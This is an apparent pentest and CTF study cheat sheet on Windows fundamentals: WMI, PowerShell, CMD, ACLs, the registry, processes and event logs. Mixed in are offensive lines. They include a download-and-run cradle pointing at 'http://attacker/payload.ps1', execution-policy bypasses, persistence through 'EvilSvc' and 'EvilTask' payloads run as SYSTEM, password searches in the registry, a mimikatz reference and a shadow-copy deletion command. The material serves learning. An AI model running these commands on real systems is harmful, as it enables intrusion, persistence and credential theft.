# Windows Fundamentals

## Table of Contents

- [System Information & WMI](#system-information--wmi) - [PowerShell](#powershell) - [Execution Policies](#execution-policies) - [System & OS](#system--os) - [Services](#services) - [Processes](#processes) - [File System & ACLs](#file-system--acls) - [Networking](#networking) - [Scheduled Tasks](#scheduled-tasks) - [CMD](#cmd) - [User & Group Management](#user--group-management) - [File System & Permissions](#file-system--permissions) - [Services](#services-cmd) - [Networking](#networking-cmd) - [Scheduled Tasks](#scheduled-tasks-cmd) - [Security Concepts](#security-concepts) - [Identifiers & Accounts](#identifiers--accounts) - [Non-Interactive Accounts](#non-interactive-accounts) - [ACLs, DACLs, SACLs](#acls-dacls-sacls) - [Registry](#registry) - [Group Policy](#group-policy) - [Critical System Processes](#critical-system-processes) - [File Systems](#file-systems) - [Tools & MMC Snap-ins](#tools--mmc-snap-ins) - [Technologies](#technologies) - [Open Questions](#open-questions)
---

## System Information & WMI

Windows Management Instrumentation (WMI) is effectively an API layer over the OS — useful for enumeration, lateral movement, and automation.

```powershell
# OS version and build
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Version, BuildNumber

# Computer system details (hostname, domain, manufacturer)
Get-WmiObject -Class Win32_ComputerSystem

# BIOS info (useful for VM detection)
Get-WmiObject -Class Win32_BIOS

# Installed hotfixes/patches
Get-WmiObject -Class Win32_QuickFixEngineering | Sort-Object InstalledOn

# List all WMI classes (exploration)
Get-WmiObject -List

# Invoke a WMI method remotely (lateral movement potential)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe"
```

```cmd
:: Using wmic (legacy but still common in CTF/pentest contexts)
wmic os list brief
wmic computersystem get Name,Domain,Manufacturer,Model
wmic qfe list brief           :: Hotfixes / patches
wmic product get Name,Version :: Installed software
wmic logicaldisk get Caption,FileSystem,FreeSpace,Size
```

> **Note:** `wmic` is deprecated in newer Windows builds — prefer `Get-WmiObject` or `Get-CimInstance` in PowerShell.

---

## PowerShell

### Execution Policies

Execution policies control which scripts are allowed to run. They are _not_ a security boundary — they can be bypassed.

```powershell
# List all policies and their scope
Get-ExecutionPolicy -List

# Set policy for current user
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned

# Common bypass techniques (pentest/CTF)
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass
Set-ExecutionPolicy Unrestricted -Scope Process   # applies only to current session

# Encode and run (avoids policy check and logging)
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand <base64>
```

|Policy|Behaviour|
|---|---|
|`Restricted`|No scripts allowed (default on clients)|
|`AllSigned`|Only signed scripts|
|`RemoteSigned`|Local scripts OK, downloaded must be signed|
|`Unrestricted`|Everything runs, warns on downloaded scripts|
|`Bypass`|Nothing blocked, no warnings|

### Help System

```powershell
Get-Help <cmdlet>              # Basic help
Get-Help <cmdlet> -Examples    # Show usage examples
Get-Help <cmdlet> -Full        # Full documentation
Get-Help <cmdlet> -Online      # Open docs in browser
Update-Help                    # Download latest help files

Get-Command                    # List all available cmdlets
Get-Command -Module ActiveDirectory  # Filter by module
Get-Alias                      # Show aliases (e.g. ls, cat, grep equivalents)
```

### System & OS

```powershell
# OS info
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Version, BuildNumber, OSArchitecture

# Uptime
(Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime

# Environment variables
Get-ChildItem Env:
$env:PATH
$env:COMPUTERNAME
$env:USERNAME
$env:USERDOMAIN

# Hostname
hostname
$env:COMPUTERNAME

# System drives
Get-PSDrive -PSProvider FileSystem
```

### Services

```powershell
# List all services
Get-Service

# Filter running services
Get-Service | Where-Object { $_.Status -eq "Running" } | Select-Object -First 10 | Format-List

# Start / Stop / Restart a service
Start-Service   -Name wuauserv
Stop-Service    -Name wuauserv
Restart-Service -Name wuauserv

# Get detailed service info including binary path (important for privesc)
Get-WmiObject Win32_Service | Select-Object Name, StartName, PathName | Where-Object { $_.StartName -ne "LocalSystem" }

# Check service permissions (DACL on the service object)
Get-ACL -Path "HKLM:\SYSTEM\CurrentControlSet\Services\wuauserv"

# Find services running as a specific account (privesc vector)
Get-WmiObject Win32_Service | Where-Object { $_.StartName -like "*svc*" }
```

### Processes

```powershell
# List all processes
Get-Process

# Filter by name (like grep)
Get-Process | Where-Object { $_.Name -like "*chrome*" }

# Show process with owner (requires WMI)
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, @{n='Owner';e={$_.GetOwner().User}}

# Kill a process
Stop-Process -Name notepad -Force
Stop-Process -Id 1234 -Force

# Detailed process info
Get-Process -Name lsass | Select-Object *
```

### File System & ACLs

```powershell
# List directory contents (including hidden)
Get-ChildItem -Path C:\ -Force
Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue

# Find files by name pattern
Get-ChildItem -Path C:\ -Recurse -Filter "*.config" -ErrorAction SilentlyContinue

# Read file contents
Get-Content C:\path\to\file.txt
Get-Content C:\path\to\file.txt | Select-String "password"  # like grep

# Get ACL (NTFS permissions) for a path
Get-ACL -Path "C:\Windows\System32"
(Get-ACL -Path "C:\Windows\System32").Access | Format-Table IdentityReference, FileSystemRights, AccessControlType

# Set ACL — grant a user FullControl
$acl = Get-ACL "C:\TestFolder"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("joe","FullControl","Allow")
$acl.SetAccessRule($rule)
Set-ACL -Path "C:\TestFolder" -AclObject $acl

# Find world-writable directories (privesc hunting)
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | Where-Object {
    $_.Access | Where-Object { $_.IdentityReference -match "Everyone|Users" -and $_.FileSystemRights -match "Write|FullControl" }
}

# Check if a specific file has weak permissions
icacls "C:\Program Files\SomeApp\service.exe"
```

### Networking

```powershell
# IP configuration
Get-NetIPAddress
Get-NetIPConfiguration

# Active connections (like netstat)
Get-NetTCPConnection | Where-Object { $_.State -eq "Established" }
Get-NetTCPConnection | Sort-Object LocalPort

# DNS cache
Get-DnsClientCache

# ARP table
Get-NetNeighbor

# Routing table
Get-NetRoute

# Firewall rules
Get-NetFirewallRule | Where-Object { $_.Enabled -eq "True" } | Select-Object DisplayName, Direction, Action
```

### Scheduled Tasks

```powershell
# List all scheduled tasks
Get-ScheduledTask

# Get details of a specific task
Get-ScheduledTask -TaskName "TaskName" | Select-Object *

# Find tasks running as SYSTEM (privesc interest)
Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "SYSTEM" }

# Create a scheduled task (useful for persistence in labs)
$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -File C:\payload.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "MyTask" -Action $action -Trigger $trigger -RunLevel Highest
```

---

## CMD

### User & Group Management

```cmd
:: List all local users
net user

:: Detailed info on a specific user (last login, group memberships, etc.)
net user <username>

:: Add a new local user
net user <username> <password> /add

:: Delete a user
net user <username> /delete

:: Change a user's password
net user <username> <newpassword>

:: Add user to local Administrators group
net localgroup Administrators <username> /add

:: Remove user from group
net localgroup Administrators <username> /delete

:: List all local groups
net localgroup

:: List members of a specific group
net localgroup Administrators
net localgroup "Remote Desktop Users"

:: View currently logged-in users
query user
query session

:: Impersonation / run as another user
runas /user:<domain>\<username> cmd.exe
```

### File System & Permissions

```cmd
:: List all files including hidden
dir C:\ /a
dir C:\ /a:h    :: hidden only
dir C:\ /s /b   :: recursive, bare path format

:: Tree view of directory
tree C:\ /f | more

:: Print file contents (like cat)
type filename.txt

:: List NTFS permissions on a path
icacls C:\Windows
icacls "C:\Program Files\SomeApp"

:: Grant full control to a user
icacls C:\Users /grant joe:F

:: Grant read+execute
icacls C:\Scripts /grant joe:(RX)

:: Remove permissions
icacls C:\Users /remove joe

:: Reset permissions to inherited
icacls C:\Folder /reset

:: Copy file (with backup for overwrites)
copy source.txt dest.txt
xcopy /s /e /h source\ dest\   :: recursive including hidden
robocopy source\ dest\ /e      :: robust copy, preserves ACLs with /copyall
```

> **icacls permission flags:** `F`=Full, `M`=Modify, `RX`=ReadExecute, `R`=Read, `W`=Write

### Services (CMD)

```cmd
:: Query a service configuration
sc qc wuauserv

:: Start / stop a service
sc start wuauserv
sc stop  wuauserv

:: Query service status
sc query wuauserv
sc query type= all   :: all services including drivers

:: Show security descriptor (DACL/SACL — good for privesc analysis)
sc sdshow wuauserv

:: Create a service (pentest/lab use)
sc create EvilSvc binPath= "C:\payload.exe" start= auto

:: Delete a service
sc delete EvilSvc
```

### Networking (CMD)

```cmd
:: IP configuration
ipconfig
ipconfig /all          :: includes MAC, DHCP, DNS
ipconfig /displaydns   :: cached DNS entries

:: ARP table
arp -a

:: Routing table
route print

:: Active connections and listening ports
netstat -ano           :: all connections with PIDs
netstat -anob          :: include binary name (requires admin)

:: Find which process owns a port
netstat -ano | findstr :443

:: DNS lookup
nslookup <hostname>
nslookup <hostname> <dns-server>

:: Shared folders
net share

:: Map a network drive
net use Z: \\server\share /user:domain\user password

:: Disconnect a drive
net use Z: /delete

:: List connected sessions to this machine (SMB)
net session

:: Ping / trace
ping <host>
tracert <host>
```

### Scheduled Tasks (CMD)

```cmd
:: List all scheduled tasks
schtasks /query /fo LIST /v

:: Run a task immediately
schtasks /run /tn "TaskName"

:: Create a task (runs at system startup)
schtasks /create /tn "EvilTask" /tr "C:\payload.exe" /sc onstart /ru SYSTEM

:: Delete a task
schtasks /delete /tn "EvilTask" /f

:: Get help
help schtasks
```

---

## Security Concepts

### Identifiers & Accounts

|Concept|Description|
|---|---|
|**SID**|Security Identifier — uniquely identifies a user/group even across renames|
|**RID**|Relative Identifier — the last part of a SID (e.g. `500` = built-in Administrator)|
|**SAM**|Security Accounts Manager — local user/group database (`C:\Windows\System32\config\SAM`)|
|**NTLM Hash**|Stored in SAM; target for pass-the-hash attacks|
|**Kerberos**|Authentication protocol used in domain environments|
|**LSASS**|Caches credentials in memory — target for `mimikatz` / `sekurlsa::logonpasswords`|

```powershell
# Get current user's SID
whoami /user

# Get all users with their SIDs
Get-LocalUser | Select-Object Name, SID

# Get group SIDs
Get-LocalGroup | Select-Object Name, SID

# Translate SID to name
$sid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
$sid.Translate([System.Security.Principal.NTAccount])
```

### Non-Interactive Accounts

|Account|Description|
|---|---|
|`NT AUTHORITY\SYSTEM`|Equivalent to Linux root. Highest privilege on local machine.|
|`NT AUTHORITY\LocalService`|Reduced privileges, limited network access|
|`NT AUTHORITY\NetworkService`|Can authenticate to network resources using computer account credentials|

> **Pentest relevance:** Services running as `SYSTEM` are high-value privesc targets. Misconfigured service binaries or weak service DACLs can lead to `SYSTEM` shell.

### ACLs, DACLs, SACLs

- **ACL** (Access Control List): Container for ACEs
- **DACL** (Discretionary ACL): Defines _who_ can access an object and _how_
- **SACL** (System ACL): Defines _what_ to audit/log for an object
- **ACE** (Access Control Entry): Individual rule within a DACL/SACL

```powershell
# View DACL on a file
(Get-ACL "C:\sensitive.txt").Access | Format-Table

# View DACL on a registry key
(Get-ACL "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").Access

# View SACL (requires SeSecurityPrivilege / admin)
(Get-ACL -Audit "C:\sensitive.txt").Audit
```

```cmd
:: View DACL/SACL on a service
sc sdshow wuauserv
:: SDDL format: D: = DACL, S: = SACL
:: Common ACE types: A=Allow, D=Deny, AU=Audit
```

### Registry

The Registry is a hierarchical database storing OS and application configuration. Critical for persistence, enumeration, and configuration.

|Hive|Abbreviation|Description|
|---|---|---|
|`HKEY_LOCAL_MACHINE`|`HKLM`|System-wide settings, services, hardware|
|`HKEY_CURRENT_USER`|`HKCU`|Settings for the currently logged-in user|
|`HKEY_USERS`|`HKU`|All user profiles (requires SYSTEM for others)|
|`HKEY_CLASSES_ROOT`|`HKCR`|File associations and COM registration|
|`HKEY_CURRENT_CONFIG`|`HKCC`|Current hardware profile|

```powershell
# Navigate registry like a filesystem
cd HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ChildItem HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  # Autorun keys

# Read a registry value
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName

# Set a registry value
Set-ItemProperty -Path "HKCU:\Software\MyApp" -Name "Setting" -Value "1"

# Search for passwords in registry (common finding)
reg query HKLM /f "password" /t REG_SZ /s
reg query HKCU /f "password" /t REG_SZ /s
```

> **Key file locations:**
> 
> - HKCU hive on disk: `C:\Users\<username>\NTUSER.dat`
> - SAM hive: `C:\Windows\System32\config\SAM`
> - SYSTEM hive: `C:\Windows\System32\config\SYSTEM`

### Group Policy

Group Policy allows centralised configuration management, typically pushed from a Domain Controller.

- **GPO** (Group Policy Object): Container for policy settings
- **Local Group Policy (LGP):** Applied on the local machine only (`gpedit.msc`)
- **Domain GPO:** Pushed from AD DS, takes precedence over local policy

```cmd
:: Apply and refresh group policy
gpupdate /force

:: Show resultant set of policy (what is actually applied)
gpresult /r
gpresult /h report.html   :: HTML report

:: Open Local Group Policy Editor
gpedit.msc
```

```powershell
# View applied GPOs (domain-joined machines)
Get-GPResultantSetOfPolicy -ReportType Html -Path "C:\gpreport.html"
```

---

## Critical System Processes

These processes are essential to Windows and are common targets for injection and masquerading attacks.

|Process|Description|Privesc / Security Note|
|---|---|---|
|`smss.exe`|Session Manager SubSystem|Parent of `csrss.exe` and `winlogon.exe`|
|`csrss.exe`|Client Server Runtime Process — user-mode Windows subsystem|Should always have `smss.exe` as parent|
|`wininit.exe`|Initialises services and `lsass.exe` on boot|Starts before user login|
|`logonui.exe`|Handles the login screen UI||
|`lsass.exe`|Local Security Auth Server — handles logon, Kerberos, NTLM|Primary target for credential dumping (`mimikatz`)|
|`services.exe`|Service Control Manager|Parent of most `svchost.exe` instances|
|`winlogon.exe`|Handles Ctrl+Alt+Del, user profile loading, screen lock||
|`svchost.exe`|Host process for Windows services (DLL-based services)|Multiple instances expected; used as masquerade target|
|`System`|Kernel-mode system process (PID 4)|Should never have a parent process|
|`explorer.exe`|Windows shell / desktop|Spawned by `userinit.exe`; common injection target|

> **Forensic note:** Legitimate `lsass.exe` runs from `C:\Windows\System32\`. Any instance elsewhere is an IOC.

---

## File Systems

### FAT32

**Pros:** Wide device compatibility (USB, cameras, game consoles), OS cross-compatibility.  
**Cons:** Max file size 4GB; no permissions, journaling, or compression.

### NTFS

**Pros:** Granular permissions (ACLs), journaling (crash recovery), compression, encryption (EFS), large file support, hard/symbolic links.  
**Cons:** Limited native support on non-Windows OSes (macOS read-only by default, Linux via `ntfs-3g`).

|Feature|FAT32|NTFS|
|---|---|---|
|Max file size|4 GB|16 TB (practical)|
|Permissions|No|Yes (ACLs)|
|Journaling|No|Yes|
|Encryption|No|Yes (EFS)|
|OS support|Universal|Mostly Windows|

### Alternate Data Streams (ADS) — NTFS only

ADS allows hiding data inside a file. Used for both legitimate purposes (Zone.Identifier) and malware.

```powershell
# Show ADS on a file
Get-Item -Path "C:\file.txt" -Stream *

# Read ADS content
Get-Content -Path "C:\file.txt" -Stream "hidden"

# Write to an ADS
Set-Content -Path "C:\file.txt" -Stream "hidden" -Value "secret data"

# Check Zone.Identifier (set by browser downloads — useful in forensics)
Get-Content -Path "C:\Downloads\file.exe" -Stream Zone.Identifier
```

---

## Tools & MMC Snap-ins

|Tool|Command|Description|
|---|---|---|
|Computer Management|`compmgmt.msc`|Disk management, SMB shares, local users/groups, services|
|Event Viewer|`eventvwr.msc`|Windows event logs|
|Services|`services.msc`|GUI for Service Control Manager (SCM)|
|Task Manager|`taskmgr`|Processes, performance, startup items|
|Resource Monitor|`resmon`|Detailed CPU/RAM/Disk/Network per-process|
|Group Policy Editor|`gpedit.msc`|Local Group Policy (Pro/Enterprise only)|
|Registry Editor|`regedit`|Registry browsing and editing|
|Local Users and Groups|`lusrmgr.msc`|Manage local accounts and groups|
|Security Policy|`secpol.msc`|Local security policy settings|
|Disk Management|`diskmgmt.msc`|Partition management|
|MMC|`mmc`|Framework to load any snap-in|

---

## Technologies

- **Active Directory (AD DS):** Centralised directory service for domain environments. Manages users, computers, GPOs, and authentication (Kerberos).
- **Volume Shadow Copy Service (VSS):** Snapshot mechanism for backups. Attackers delete VSS copies to hinder recovery (`vssadmin delete shadows /all`).
- **Windows Defender / AMSI:** Built-in AV and Antimalware Scan Interface — relevant for evasion techniques.
- **AppLocker / WDAC:** Application whitelisting solutions.
- **BitLocker:** Full-disk encryption. Key stored in TPM or AD.
- **Event Viewer / Windows Event Logs:** Key log sources for DFIR:
    - Security log: `4624` (logon), `4625` (failed logon), `4688` (process creation), `4698` (scheduled task created), `4768/4769` (Kerberos TGT/TGS)
    - System log: Service start/stop, driver errors
    - Application log: Application-specific events
- **WinRM / PSRemoting:** Remote PowerShell execution — lateral movement vector.
- **SMB:** Windows file sharing protocol. Versions: SMBv1 (vulnerable, EternalBlue), SMBv2/3 (current).

---

## Open Questions